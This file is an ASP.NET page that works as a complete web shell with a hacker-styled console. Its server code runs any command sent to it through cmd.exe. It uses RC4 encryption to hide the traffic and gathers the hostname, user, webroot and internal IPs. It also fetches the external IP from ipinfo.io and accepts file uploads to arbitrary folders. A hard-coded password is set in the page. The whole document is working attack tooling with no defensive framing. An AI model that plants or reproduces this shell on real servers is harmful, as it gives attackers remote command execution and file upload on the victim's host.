<%@ Page Language="C#" AutoEventWireup="true" CodeFile="Default.aspx.cs" Inherits="_Default" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Web.Script.Serialization" %>

<!DOCTYPE html>

<script runat="server">
    protected void Page_load(object sender, EventArgs e)
    {
        if (Request.Headers["X-Requested-With"] == "XMLHttpRequest")
        {
            JavaScriptSerializer json = new JavaScriptSerializer();

            if (Request.Form.Count > 1 && Request["boots"] != null)
            {
                String key = Request.Form.GetKey(0);
                Dictionary<String, String> data = new Dictionary<string, string>();
                // get command's results
                var host = Dns.GetHostEntry(Dns.GetHostName());
                List<String> iplist = new List<string>();
                foreach (var ip in host.AddressList)
                {
                    IPAddress address = IPAddress.Parse(ip.ToString());
                    if (address.AddressFamily == AddressFamily.InterNetwork)
                    {
                        iplist.Add(ip.ToString());
                    }
                }
                data.Add("ip_local", json.Serialize(iplist));
                data.Add("hostname", shell("hostname"));
                data.Add("user", shell("whoami"));
                data.Add("ip_ext", new WebClient().DownloadString("http://ipinfo.io/ip"));
                data.Add("webroot", HttpContext.Current.Server.MapPath("~"));
                // return
                Debug.WriteLine(encrypt(key, json.Serialize(data)));
                Response.Write(encrypt(key, json.Serialize(data)));
                Response.End();
            }

            if (!String.IsNullOrEmpty(Request["f"]) && Request.Files["data_upload"] != null)
            {
                String key = Request.Form.GetKey(0);
                HttpPostedFile file = Request.Files["data_upload"];
                String folder = decrypt(key, Request["f"]);
                folder = Path.GetDirectoryName(folder) + "\\";
                
                try
                {
                    file.SaveAs(folder + file.FileName);
                    Response.Write(encrypt(key, "Upload successful"));
                }
                catch
                {
                    Response.Write(encrypt(key, "Upload Failed"));
                }
                Response.End();
            }

            if (Request.Form.Count > 0)
            {
                String key = Request.Form.GetKey(0);
                String cmd = decrypt(key, Request[key]);
                String pwd = Directory.GetCurrentDirectory();
                List<String> content = new List<string>(new String[] { pwd, shell(cmd) });
                Response.Write(encrypt(key, json.Serialize(content)));
                Response.End();
            }

        }
    }

    private String shell(String cmd)
    {
        System.Diagnostics.Process proc = new System.Diagnostics.Process();
        proc.StartInfo.FileName = "cmd.exe";
        proc.StartInfo.Arguments = "/c " + cmd;
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.Start();
        return proc.StandardOutput.ReadToEnd();
    }

    private byte[] RC4(byte[] pwd, byte[] data) {
        int a, i, j, k, tmp;
        int[] key, box;
        byte[] result;

        key = new int[256];
        box = new int[256];
        result = new byte[data.Length];

        for (i = 0; i < 256; i++) {
            key[i] = pwd[i % pwd.Length];
            box[i] = i;
        }
        for (j = i = 0; i < 256; i++) {
            j = (j + box[i] + key[i]) % 256;
            tmp = box[i];
            box[i] = box[j];
            box[j] = tmp;
        }
        for (a = j = i = 0; i < data.Length; i++) {
            a++;
            a %= 256;
            j += box[a];
            j %= 256;
            tmp = box[a];
            box[a] = box[j];
            box[j] = tmp;
            k = box[((box[a] + box[j]) % 256)];
            result[i] = (byte)(data[i] ^ k);
        }
        return result;
    }

    private String encrypt(String key, String plaintext)
    {
        return Convert.ToBase64String(
                    RC4(
                        Encoding.UTF8.GetBytes(key), 
                        Encoding.UTF8.GetBytes(plaintext)
                    )
               );
    }

    private String decrypt(String key, String cipher)
    {
        return Encoding.UTF8.GetString(
                    RC4(
                        Encoding.UTF8.GetBytes(key), 
                        Convert.FromBase64String(cipher)
                    )
               );
    }
</script>

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title></title>
    <!-- css -->
    <style type="text/css" media="screen">
        body{
            background-color:#080808;
            font-family: Consolas,monospace,serif;
            color: #53a9f1;
            font-size: 15px;
        }

        #folder {float:left;
            background: 
                url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACE0lEQVR4XpWRu24TURCGZ+ac9Up2CAJEkCwXFhJEkaCjMC6Twi5c2MkLIPEU9HQ8Dw1CPARCIJGCjgIjSEKcvZ0L/+zFQknFaL+d/8xtR2eps8ViQavVqtYnJyf0XzabzWg+nxsMscvl0h4fHysGmqbTKcG2XplMJlttjo6OJEmSIXhujHkC9kXkMXIj51yhjMdjo6a+06PRSIbDYbQhhD1mfommF+A2wWKMym/E3w8Gg68aomvmvV/nef6BscHTfr//BhscIp4Aahs8hmzgC7ppEZt9ybLslU2l6hlyfSE2TEx4OjPMtEvXP98d2K9TLgf28O6nhxe+/4AkYStCwpFEmAWVzFx3xMj6Jg8fQiQXNOT2dnqXz+zBnYux0Nn91BClliiBt8DoMkAtRiIPnCeqQKE42vWB920MPjcStWGLJXgg7QBtVqmv0OYdTtiokNJzljtyeUUMSMkUB1qdqwaaK9Q7YviATa6kqChDotKCq6qlvEkGuhzqY64DHAZA6IAyLylmbcGmarhUjTh047uBzWYOH9/YP6VUO0ksTYyBQ/ObQqQItn8UUmPsfXMfIdTnqvCc29Of8uPRvfhOen6EBFdSX15gYS9NL2OeICdRm1sqT2frDZ3ab7/4461UXuc9n3Y3zSyRhSNT8/+xD0TkqLJdyQVy38/pvO6ZH4gWNUkQSKA1pYR6jIB/zaLl7Weiv7haPsJBmaAZAAAAAElFTkSuQmCC) 
                no-repeat 10px 6px #fff;
	        width: 235px;
	        color: #000;
	        /*margin-bottom: 2%;*/
	        font: 12px Consolas,Helvetica,Sans-serif;
	        padding: 6px 15px 6px 35px;
	        -webkit-border-radius: 20px 5px 5px 20px;
	        -moz-border-radius: 20px 5px 5px 20px;
	        border-radius: 20px 0px 0px 20px;
        }

        #cmd{
            float:left;
	        background: 
                url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAALEwAACxMBAJqcGAAAAHdJREFUOI3t0rEJwmAUReEPCWkEWweIRFsbSesAjpkZLFLEKSQTKIHsEIs0YpHA+yGVtz2cUzwe/0GBBvuIvEGPHG00Als88EyNtKmRHQbcI3KGGi8co/I7VT5F5BIVrui+2M30I3NrMtPVDxh/4BmXhUC3wFfYBz09EuR/gQBrAAAAAElFTkSuQmCC) 
                no-repeat 10px 6px #fff;
	        color: #000;
	        width: 305px;
	        margin-left: 3%;
	        margin-bottom: 2%;
            margin-right: 1px;
	        font: 12px Consolas,Helvetica,Sans-serif;
	        padding: 6px 15px 6px 35px;
	        -webkit-border-radius: 20px 5px 5px 20px;
	        -moz-border-radius: 20px 5px 5px 20px;
	        border-radius: 20px 0px 0px 20px;
        }

        #browse{
            float:left;
            background-color: #444;
	        width: 50px;
            margin-left: -7px;
	        font: 12px Consolas,Helvetica,Sans-serif;
	        padding: 6px 15px 6px 15px;
        }

        input[type="submit"]{ 
            float:left;
            background-color: #444;
	        width: 85px;
            color: #53a9f1;
            border: 0 none;
            margin-left: -8px;
	        font: 12px Consolas,Helvetica,Sans-serif;
	        padding: 6px 15px 6px 15px;
	        -webkit-border-radius: 5px 20px 20px 5px;
	        -moz-border-radius: 20px;
	        border-radius: 0px 20px 20px 0px;
        }

        #password{
	        background: 
                url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABdklEQVQ4jaWQv0tCURiG33M1zaup9AsiSYlqCCKDlpxsavVfaKjG7A8IdWiJoBqaWhzbamlou0tBFEVBoCllaXhRwePVq171dhpCqCteoV44y8fzPec9hzDG8DOEEGT3JgP82HjI7PF51WKSKrm3aPk9FXGHC7SD1w7EXXfAOeE5bckE7OMZjLPB7HKh3qCCc+N+Wctz0MRmc4RUDuBYxmcPZUnpszhbSsUpzw/6X7aH/FreqB0YVHilpAjAcCXuzAAAvu+sYYB3+AEIuoJKuUVH14+d2nn1PIxypZEa7tWgLCtR0+VR0D7FAy0CtABVUZFPN6lclc60fMcfGE1SRM2KArOMgFjrIA4OaeGJKlJsa25foloejLFfpx3xZI01b1ZY6WKJPWzag934jgbtFOICqrIFzcdXzB9KB924rgIA4CwEtwmrHqIvMBhNuss9BaTPjsVp+e8CkP7/PYHVcv9roEpV3WVdgRhLLRQSGXp3nV/VE3wBfLyv0nLVH2sAAAAASUVORK5CYII=") 
                no-repeat 10px 6px #fff;
	        color: #000;
	        width: 100px;
	        margin-left: 15%;
	        margin-bottom: 2%;
	        font: 12px Consolas,Helvetica,Sans-serif;
	        padding: 6px 15px 6px 35px;
	        -webkit-border-radius: 20px;
	        -moz-border-radius: 20px;
	        border-radius: 20px;
        }

        #output{
	        background: 10px 6px #444;
	        color: #03FC15;
	        margin: 0px; 
	        width: 75%; 
	        height: 550px;
	        font: 14px Consolas,Helvetica,Sans-serif;
	        -webkit-border-radius: 10px;
	        -moz-border-radius: 10px;
	        border-radius: 10px;
        }

        #info{
	        background: 10px 6px #444;
	        margin: 0px; 
	        width: 23%; 
	        height: 550px;
            color: #53a9f1;
	        font: 14px Consolas,Helvetica,Sans-serif;
	        -webkit-border-radius: 10px;
	        -moz-border-radius: 10px;
	        border-radius: 10px;
        }

        .textform{
	        border: 0 none;
	        text-shadow: 0 2px 2px rgba(0, 0, 0, 0.3);
	        -webkit-box-shadow: 0 1px 0 rgba(255, 255, 255, 0.1), 0 1px 3px rgba(0, 0, 0, 0.2) inset;
	        -moz-box-shadow: 0 1px 0 rgba(255, 255, 255, 0.1), 0 1px 3px rgba(0, 0, 0, 0.2) inset;
	        box-shadow: 0 1px 0 rgba(255, 255, 255, 0.1), 0 1px 3px rgba(0, 0, 0, 0.2) inset;
	        -webkit-transition: all 0.7s ease 0s;
	        -moz-transition: all 0.7s ease 0s;
	        -o-transition: all 0.7s ease 0s;
	        transition: all 0.7s ease 0s;
        }

        #cmd autofocus{
	        width: 200px;
        }
	
    </style>
    <!-- javascript boots -->
    <script type="text/javascript" src="/scripts/jquery-1.10.2.min.js"></script> 
    <script type="text/javascript">
        $(document).ready(function () {
            var key = $('#password')[0].value;
            $.ajax({
                type: 'post',
                url: window.location.href,
                data: {
                    [key]: true,
                    boots: true
                },
                success: function (data) {
                    var data = JSON.parse(decrypt(data));
                    $('#folder').val(data.webroot);
                    $('#info').val(
                        "\n[Hostname]\n\t" + data.hostname
                        + "\n[User]\n\t" + data.user
                        + "\n[Root]\n\t" + data.webroot
                        + "\n\n[Ip public]\n\t" + data.ip_ext
                        + "\n[Ip private]" + (function () {
                            var result = "";
                            iplist = JSON.parse(data.ip_local);
                            for (ip in iplist) {
                                result += "\n\t" + iplist[ip];
                            }
                            return result;
                        })()
                    );
                }
            });
        });
	</script>
</head>
<body>
	<!-- upload -->
	<form id='uploadform' method="post" enctype="multipart/form-data">
	    <input type="text" name="f" id="folder" class="textform" placeholder="Destination folder">
        <label for="data_upload" id="browse">Browse</label>
	    <input type="file" name="data_upload", id="data_upload" style="display: none;">
	    <input type="submit" value="Upload" name="submit">
	</form>
    <!-- input form -->
	<input type="text" id="cmd" class="textform" placeholder="Command line ..." autofocus>
	<input type="submit" id="sendCommand" value="Execute">
	<input type="password" id="password" class="textform" value="cns3c_p4swd" placeholder="password for encrypt"><br>
	<!-- output -->
	<textarea id="output" class="textform" cols="30" rows="10"></textarea>
	<textarea id="info" class="textform" cols="30" rows="10"></textarea>

    <!-- javascript events -->
    <script type="text/javascript">
		// event press enter key
		$("#cmd").keydown(function(e){
			if (e.keyCode == 13){
				$("#sendCommand")[0].click();
			}
		})
		// action send command
		$("#sendCommand").click(function(){
			cmd = $('#cmd')[0].value;
            key = $('#password')[0].value;

			$.ajax({
				type: 'post',
				url: window.location.href,
				data: {
                    [key]: encrypt(cmd),
				},
                success: function (data) {
                    console.log(JSON.parse(decrypt(data))[1])
                    data = JSON.parse(decrypt(data));
                    $('#output').html($('#output').html() + data[0] + "> " + cmd + "\n" + data[1]);
                    $("#output").scrollTop($("#output")[0].scrollHeight - $("#output").height());
				}
			});
		});
		// action upload
		$('#uploadform').submit(function(e){
			e.preventDefault();
			folder = this.f.value;
			dir = encrypt( folder );
			$('#folder').val(dir);

			var params = $(this).serializeArray();
			var files = $('#data_upload')[0].files;
			var formdata = new FormData();

            formdata.append($('#password')[0].value, "");
            formdata.append("f", params[0].value);
			formdata.append("data_upload", files[0]);
			
			$.ajax({
				type: 'post',
				url: window.location.href,
				data: formdata,
        		contentType: false,
        		processData: false,
				success: function(data){
					$('#folder').val(folder);
					alert(decrypt(data));
				},
				error: function(error){
					console.log(error);
				}
			});
		})
		// Algorithm RC4 
		function rc4(key, str) {
			var s = [], j = 0, x, res = '';
			for (var i = 0; i < 256; i++) {
				s[i] = i;
			}
			for (i = 0; i < 256; i++) {
				j = (j + s[i] + key.charCodeAt(i % key.length)) % 256;
				x = s[i];
				s[i] = s[j];
				s[j] = x;
			}
			i = 0;
			j = 0;
			for (var y = 0; y < str.length; y++) {
				i = (i + 1) % 256;
				j = (j + s[i]) % 256;
				x = s[i];
				s[i] = s[j];
				s[j] = x;
				res += String.fromCharCode(str.charCodeAt(y) ^ s[(s[i] + s[j]) % 256]);
			}
			return res;		}

		function encrypt(text){
			key = $('#password')[0].value;
			return btoa(rc4(key, text));
            return text;
		}

		function decrypt(text){
			key = $('#password')[0].value;
			return rc4(key, atob(text));
            return text;
		}
	</script>
</body>
</html>
